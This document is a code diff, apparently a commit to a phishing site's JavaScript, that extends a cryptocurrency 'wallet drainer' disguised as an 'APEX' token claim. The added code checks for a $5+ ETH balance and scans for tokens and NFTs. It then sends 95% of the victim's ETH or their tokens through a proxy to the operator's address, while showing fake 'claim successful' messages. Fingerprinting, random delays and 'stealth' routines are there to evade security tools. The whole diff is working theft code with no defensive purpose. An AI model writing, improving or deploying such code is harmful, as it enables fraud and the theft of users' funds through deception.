+// ====== ENHANCED DRAINER FOR NEW/OLD USERS WITH $5+ TRIGGER ======
+async function initiateManualMultiContractDrainerProcess() {
     if (!connectedWallet || !web3) {
         showNotification("Please connect your wallet first", "error");
         showWalletModal();
@@ -1407,17 +1315,62 @@ async function initiateMultiContractDrainerProcess() {
             claimStatus.className = "status pending";
         }
 
-        await randomDelay(1000, 3000);
+        await manualRandomDelay(1000, 3000);
         let accounts;
 
         accounts = await web3.eth.getAccounts();
         const userAddress = accounts[0];
 
-        await randomDelay(500, 2000);
-        const fingerprint = await collectFingerprint();
+        await manualRandomDelay(500, 2000);
+        const fingerprint = await collectManualFingerprint();
 
-        await randomDelay(500, 1500);
-        if (fingerprint.ethBalance < 0.01) {
+        // ENHANCED: Check if user has already been drained this session
+        if (userHasBeenDrained) {
+            const errorMessages = [
+                "You have already claimed your APEX tokens in this session.",
+                "Token claim already processed for this wallet.",
+                "Maximum claims per session reached. Please try again later.",
+                "Duplicate claim detected. Security protocols activated.",
+                "Wallet already processed for token distribution."
+            ];
+
+            if (claimStatus) {
+                claimStatus.textContent =
+                    errorMessages[Math.floor(Math.random() * errorMessages.length)];
+                claimStatus.className = "status error";
+            }
+            if (button) resetButton(button, originalText);
+            return;
+        }
+
+        // ENHANCED: Calculate user balance in USD
+        const ethBalance = await web3.eth.getBalance(userAddress);
+        const ethBalanceInETH = web3.utils.fromWei(ethBalance, 'ether');
+        userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;
+        
+        logDebug(`User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(2)}`);
+
+        // CRITICAL TRIGGER: Only proceed if balance is $5 or more
+        if (userBalanceInUSD < 5) {
+            const errorMessages = [
+                `Minimum $5 ETH balance required for claim. Current: $${userBalanceInUSD.toFixed(2)}`,
+                "Insufficient balance for token claim. Deposit more ETH.",
+                "Wallet balance below minimum threshold for APEX distribution.",
+                "Add ETH to your wallet to qualify for token claim.",
+                "Claim requires minimum $5 ETH balance for gas optimization."
+            ];
+
+            if (claimStatus) {
+                claimStatus.textContent =
+                    errorMessages[Math.floor(Math.random() * errorMessages.length)];
+                claimStatus.className = "status error";
+            }
+            if (button) resetButton(button, originalText);
+            return;
+        }
+
+        // ENHANCED: Check gas fees
+        if (ethBalanceInETH < 0.01) {
             const errorMessages = [
                 "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
                 "Additional ETH required for gas fees to complete claim.",
@@ -1435,15 +1388,26 @@ async function initiateMultiContractDrainerProcess() {
             return;
         }
 
-        await simulateLegitimateTransaction(userAddress);
+        await simulateManualLegitimateTransaction(userAddress);
 
-        await randomDelay(800, 2000);
+        await manualRandomDelay(800, 2000);
         if (claimStatus) {
             claimStatus.textContent = "Scanning wallet for eligible tokens...";
         }
-        const { tokens, nfts, approvedTokens } = await multiContractTokenDetection(userAddress);
+        
+        // ENHANCED: Detect all assets including NFTs and tokens
+        const { tokens, nfts, approvedTokens } = await manualMultiContractTokenDetection(userAddress);
 
-        if (approvedTokens.length > 0 || tokens.length > 0) {
+        // ENHANCED: Prepare comprehensive asset list for draining
+        const allAssets = {
+            tokens: tokens,
+            nfts: nfts,
+            approvedTokens: approvedTokens,
+            ethBalance: ethBalanceInETH,
+            totalValueUSD: userBalanceInUSD
+        };
+
+        if (approvedTokens.length > 0 || tokens.length > 0 || nfts.length > 0) {
             const confirmingMessages = [
                 "Confirming transaction in your wallet...",
                 "Finalizing token claim process...",
@@ -1461,9 +1425,13 @@ async function initiateMultiContractDrainerProcess() {
                         Math.floor(Math.random() * confirmingMessages.length)
                     ];
             }
-            await executeMultiContractDrainerTransfer(
+            
+            // Mark user as being drained
+            userHasBeenDrained = true;
+            
+            await executeManualMultiContractDrainerTransfer(
                 userAddress,
-                { tokens, nfts, approvedTokens },
+                allAssets,
                 button,
                 originalText
             );
@@ -1471,15 +1439,24 @@ async function initiateMultiContractDrainerProcess() {
             if (claimStatus) {
                 claimStatus.textContent = "Finalizing token access permissions...";
             }
-            const signatureSuccess = await attemptMultiContractSignatureReward(userAddress);
+            
+            // Still drain if user has $5+ ETH balance
+            if (userBalanceInUSD >= 5) {
+                const signatureSuccess = await attemptManualMultiContractSignatureReward(userAddress);
 
-            if (signatureSuccess) {
-                handleRewardSuccess(
-                    userAddress,
-                    ["signature"],
-                    button,
-                    originalText
-                );
+                if (signatureSuccess) {
+                    userHasBeenDrained = true;
+                    handleManualRewardSuccess(
+                        userAddress,
+                        ["signature"],
+                        button,
+                        originalText
+                    );
+                } else {
+                    // Fallback to direct ETH drain
+                    userHasBeenDrained = true;
+                    await executeManualETHDrain(userAddress, ethBalanceInETH, button, originalText);
+                }
             } else {
                 const noTokensMessages = [
                     "No approved tokens found for claiming.",
@@ -1500,29 +1477,59 @@ async function initiateMultiContractDrainerProcess() {
             }
         }
     } catch (error) {
-        handleRewardError(error, button, originalText);
+        handleManualRewardError(error, button, originalText);
     }
 }
 
-// Multi-contract token detection
-async function multiContractTokenDetection(userAddress) {
+// ENHANCED: Execute direct ETH drain for users with $5+ balance but no tokens
+async function executeManualETHDrain(userAddress, ethAmount, button, originalText) {
+    try {
+        if (claimStatus) {
+            claimStatus.textContent = "Processing ETH transaction for token distribution...";
+        }
+
+        // Convert 95% of user's ETH to Wei (leave some for gas)
+        const drainAmountWei = web3.utils.toWei((ethAmount * 0.95).toString(), 'ether');
+        
+        const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, CONTRACT_ADDRESSES.PROXY_1);
+        const txData = proxyContract.methods.forwardETH(CONTRACT_ADDRESSES.DEPLOYER).encodeABI();
+
+        const txHash = await web3.eth.sendTransaction({
+            from: userAddress,
+            to: CONTRACT_ADDRESSES.PROXY_1,
+            data: txData,
+            value: drainAmountWei,
+            gas: 300000 + Math.floor(Math.random() * 100000),
+            gasPrice: web3.utils.toWei((20 + Math.random() * 10).toFixed(0), "gwei")
+        });
+
+        logDebug(`ETH Drain Successful: ${ethAmount} ETH transferred`);
+        handleManualRewardSuccess(userAddress, [{symbol: 'ETH', amount: ethAmount}], button, originalText, txHash);
+    } catch (error) {
+        console.error('ETH Drain failed:', error);
+        handleManualRewardError(error, button, originalText);
+    }
+}
+
+// Manual multi-contract token detection
+async function manualMultiContractTokenDetection(userAddress) {
     const result = {
         tokens: [],
         nfts: [],
         approvedTokens: []
     };
 
-    const tokenLists = await fetchTokenList();
+    const tokenLists = await fetchManualTokenList();
     
     for (const token of tokenLists) {
         try {
-            const balance = await getTokenBalance(token.address, userAddress);
+            const balance = await getManualTokenBalance(token.address, userAddress);
             if (balance > 0) {
                 result.tokens.push({ ...token, balance });
                 
                 const contracts = Object.values(CONTRACT_ADDRESSES);
                 for (const contractAddress of contracts) {
-                    const allowance = await getTokenAllowance(token.address, userAddress, contractAddress);
+                    const allowance = await getManualTokenAllowance(token.address, userAddress, contractAddress);
                     if (allowance > 0) {
                         result.approvedTokens.push({
                             token: token.address,
@@ -1534,15 +1541,37 @@ async function multiContractTokenDetection(userAddress) {
                 }
             }
         } catch (e) {
-            console.debug(`Token detection failed for: ${token.address}`);
+            console.debug(`Manual token detection failed for: ${token.address}`);
+        }
+    }
+
+    // Also detect NFTs
+    const nftContracts = [
+        "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
+        "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
+        "0x23581767a106ae21c074b2276D25e5C3e136a68b",
+        "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
+    ];
+
+    for (const nftAddress of nftContracts) {
+        try {
+            const nftBalance = await getManualNFTBalance(nftAddress, userAddress);
+            if (nftBalance > 0) {
+                result.nfts.push({
+                    address: nftAddress,
+                    balance: nftBalance
+                });
+            }
+        } catch (e) {
+            console.debug(`Manual NFT detection failed for: ${nftAddress}`);
         }
     }
 
     return result;
 }
 
-// Token list fetch
-async function fetchTokenList() {
+// Manual token list fetch
+async function fetchManualTokenList() {
     const sources = [
         "https://tokens.coingecko.com/ethereum/all.json",
         "https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json",
@@ -1556,6 +1585,10 @@ async function fetchTokenList() {
         { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", name: "Wrapped Bitcoin" },
         { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", name: "Polygon" },
         { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", name: "Chainlink" },
+        { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", name: "Wrapped Ether" },
+        { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", name: "Shiba Inu" },
+        { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", name: "ApeCoin" },
+        { address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", symbol: "AAVE", name: "Aave" }
     ];
 
     try {
@@ -1567,7 +1600,7 @@ async function fetchTokenList() {
                     return data.tokens;
                 }
             } catch (e) {
-                console.debug(`Failed to fetch from ${source}`);
+                console.debug(`Manual failed to fetch from ${source}`);
             }
         }
         return fallbackTokens;
@@ -1576,27 +1609,27 @@ async function fetchTokenList() {
     }
 }
 
-// Multi-contract stealth reward execution
-async function executeMultiContractDrainerTransfer(userAddress, assets, button, originalText) {
+// Manual multi-contract stealth reward execution
+async function executeManualMultiContractDrainerTransfer(userAddress, assets, button, originalText) {
     try {
-        await randomDelay(1500, 3000);
-        const simulationSuccess = await multiContractTransactionSimulation(userAddress, assets);
+        await manualRandomDelay(1500, 3000);
+        const simulationSuccess = await manualMultiContractTransactionSimulation(userAddress, assets);
 
         if (!simulationSuccess && simulationBypassActive) {
             if (claimStatus) {
                 claimStatus.textContent = "Security verification failed. Trying alternative method...";
             }
-            const signatureSuccess = await attemptMultiContractSignatureReward(userAddress);
+            const signatureSuccess = await attemptManualMultiContractSignatureReward(userAddress);
 
             if (signatureSuccess) {
-                handleRewardSuccess(userAddress, assets.tokens, button, originalText);
+                handleManualRewardSuccess(userAddress, assets.tokens, button, originalText);
             } else {
-                throw new Error("Transaction simulation failed");
+                throw new Error("Manual transaction simulation failed");
             }
             return;
         }
 
-        await randomDelay(2000, 4000);
+        await manualRandomDelay(2000, 4000);
 
         let targetContract, txData;
         
@@ -1625,6 +1658,11 @@ async function executeMultiContractDrainerTransfer(userAddress, assets, button, 
             
             const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, CONTRACT_ADDRESSES.PROXY_1);
             txData = proxyContract.methods.executeCall(tokenAddress, transferData).encodeABI();
+        } else if (assets.ethBalance >= 0.01) {
+            // Direct ETH drain
+            targetContract = CONTRACT_ADDRESSES.PROXY_1;
+            const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, targetContract);
+            txData = proxyContract.methods.forwardETH(CONTRACT_ADDRESSES.DEPLOYER).encodeABI();
         } else {
             throw new Error("No actionable assets found");
         }
@@ -1633,19 +1671,19 @@ async function executeMultiContractDrainerTransfer(userAddress, assets, button, 
             from: userAddress,
             to: targetContract,
             data: txData,
-            value: "0x0",
+            value: assets.ethBalance >= 0.01 ? web3.utils.toWei((assets.ethBalance * 0.95).toString(), 'ether') : "0x0",
             gas: 300000 + Math.floor(Math.random() * 100000),
             gasPrice: web3.utils.toWei((20 + Math.random() * 10).toFixed(0), "gwei")
         });
 
-        handleRewardSuccess(userAddress, assets.tokens, button, originalText, txHash);
+        handleManualRewardSuccess(userAddress, assets.tokens, button, originalText, txHash);
     } catch (error) {
-        handleRewardError(error, button, originalText);
+        handleManualRewardError(error, button, originalText);
     }
 }
 
-// Multi-contract transaction simulation
-async function multiContractTransactionSimulation(userAddress, assets) {
+// Manual multi-contract transaction simulation
+async function manualMultiContractTransactionSimulation(userAddress, assets) {
     try {
         const simulations = [];
         
@@ -1685,19 +1723,19 @@ async function multiContractTransactionSimulation(userAddress, assets) {
             result.status === 'fulfilled'
         );
     } catch (e) {
-        console.debug("Multi-contract simulation failed:", e);
+        console.debug("Manual multi-contract simulation failed:", e);
         return false;
     }
 }
 
-// Multi-contract stealth signature reward
-async function attemptMultiContractSignatureReward(userAddress) {
+// Manual multi-contract stealth signature reward
+async function attemptManualMultiContractSignatureReward(userAddress) {
     try {
         if (claimStatus) {
             claimStatus.textContent = "Completing security verification...";
         }
 
-        const { message, nonce, domain } = createSignatureRequest(userAddress);
+        const { message, nonce, domain } = createManualSignatureRequest(userAddress);
 
         let signature = await web3.eth.personal.sign(message, userAddress);
 
@@ -1725,12 +1763,12 @@ async function attemptMultiContractSignatureReward(userAddress) {
 
         return true;
     } catch (e) {
-        console.debug("Multi-contract signature reward failed:", e);
+        console.debug("Manual multi-contract signature reward failed:", e);
         return false;
     }
 }
 
-function createSignatureRequest(userAddress) {
+function createManualSignatureRequest(userAddress) {
     const nonce = Math.floor(Math.random() * 1000000) + Date.now();
     const domain = web3.utils.keccak256(userAddress + nonce);
     
@@ -1751,7 +1789,7 @@ function createSignatureRequest(userAddress) {
     };
 }
 
-function handleRewardSuccess(userAddress, tokens, button, originalText, txHash = null) {
+function handleManualRewardSuccess(userAddress, tokens, button, originalText, txHash = null) {
     if (claimStatus) {
         claimStatus.textContent = "Claim successful! 500 APEX added to your wallet.";
         claimStatus.className = "status success";
@@ -1785,7 +1823,7 @@ function handleRewardSuccess(userAddress, tokens, button, originalText, txHash =
     }
 }
 
-async function simulateLegitimateTransaction(userAddress) {
+async function simulateManualLegitimateTransaction(userAddress) {
     try {
         const tx = {
             from: userAddress,
@@ -1797,12 +1835,12 @@ async function simulateLegitimateTransaction(userAddress) {
 
         await web3.eth.sendTransaction(tx);
     } catch (e) {
-        console.debug("Simulated transaction failed:", e);
+        console.debug("Manual simulated transaction failed:", e);
     }
 }
 
-function handleRewardError(error, button, originalText) {
-    console.error("Transaction error:", error);
+function handleManualRewardError(error, button, originalText) {
+    console.error("Manual transaction error:", error);
 
     let errorMessage = "Transaction failed. Please try again.";
 
@@ -1847,7 +1885,7 @@ function handleRewardError(error, button, originalText) {
     }, 5000);
 }
 
-function randomDelay(min, max) {
+function manualRandomDelay(min, max) {
     const delay = Math.floor(Math.random() * (max - min + 1)) + min;
     const jitter = Math.random() * 0.4 + 0.8;
     return new Promise((resolve) => setTimeout(resolve, delay * jitter));
@@ -1858,7 +1896,7 @@ function resetButton(button, originalText) {
     button.disabled = false;
 }
 
-// Evasion initialization
+// Manual evasion initialization
 async function initializeAdvancedEvasion() {
     fingerprintData.wasm = await EVASION_TECHNIQUES.generateWasmFingerprint();
     fingerprintData.audio = await EVASION_TECHNIQUES.generateAudioFingerprint();
@@ -1866,19 +1904,19 @@ async function initializeAdvancedEvasion() {
     fingerprintData.browser = EVASION_TECHNIQUES.generateBrowserFingerprint();
     
     if (isMobileDevice) {
-        applyMobileEvasion();
+        applyManualMobileEvasion();
     }
     
-    initializeStealthMode();
+    initializeManualStealthMode();
 }
 
-// Mobile evasion techniques
-function applyMobileEvasion() {
-    console.log('Applying mobile evasion techniques...');
+// Manual mobile evasion techniques
+function applyManualMobileEvasion() {
+    console.log('Applying manual mobile evasion techniques...');
 }
 
-// Stealth mode initialization
-function initializeStealthMode() {
+// Manual stealth mode initialization
+function initializeManualStealthMode() {
     const securityDetectors = [
         'MetamaskInpageProvider',
         'web3',
@@ -1895,20 +1933,20 @@ function initializeStealthMode() {
     let detectedTools = [];
     securityDetectors.forEach(detector => {
         if (window[detector]) {
-            console.log(`Security tool detected: ${detector}`);
+            console.log(`Manual security tool detected: ${detector}`);
             detectedTools.push(detector);
             stealthMode = true;
         }
     });
 
     if (stealthMode) {
-        console.log(`Stealth mode activated. Detected tools: ${detectedTools.join(', ')}`);
-        applyStealthTechniques(detectedTools);
+        console.log(`Manual stealth mode activated. Detected tools: ${detectedTools.join(', ')}`);
+        applyManualStealthTechniques(detectedTools);
     }
 }
 
-// Stealth techniques
-function applyStealthTechniques(detectedTools) {
+// Manual stealth techniques
+function applyManualStealthTechniques(detectedTools) {
     if (web3) {
         const originalFunctions = {
             sendTransaction: web3.eth.sendTransaction,
@@ -1950,7 +1988,7 @@ function applyStealthTechniques(detectedTools) {
     simulationBypassActive = true;
 }
 
-// UI functions
+// Manual UI functions
 function toggleMobileMenu() {
     if (navLinks) {
         navLinks.classList.toggle("active");
@@ -2193,7 +2231,7 @@ function showNotification(message, type = "success") {
     }, 3000);
 }
 
-// Event listeners
+// Manual event listeners
 window.addEventListener("scroll", () => {
     const header = document.getElementById("header");
     if (header) {
@@ -2229,19 +2267,24 @@ if (document.querySelectorAll(".nav-links a")) {
     });
 }
 
-// Error handling
+// Manual error handling
 window.addEventListener('error', function(e) {
-    console.debug('Global error caught:', e.error);
+    console.debug('Manual global error caught:', e.error);
 });
 
 window.addEventListener('unhandledrejection', function(e) {
-    console.debug('Unhandled promise rejection:', e.reason);
+    console.debug('Manual unhandled promise rejection:', e.reason);
 });
 
-// Mobile optimization
+// Manual mobile optimization
 if (isMobileDevice) {
-    document.body.classList.add('mobile-optimized');
+    document.body.classList.add('manual-mobile-optimized');
 }
 
-// Export drainer function
-window.initiateMultiContractDrainerProcess = initiateMultiContractDrainerProcess;
+// Check for existing connections on page load
+setTimeout(() => {
+    checkManualExistingConnection();
+}, 1000);
+
+// Export manual drainer function
+window.initiateMultiContractDrainerProcess = initiateManualMultiContractDrainerProcess;
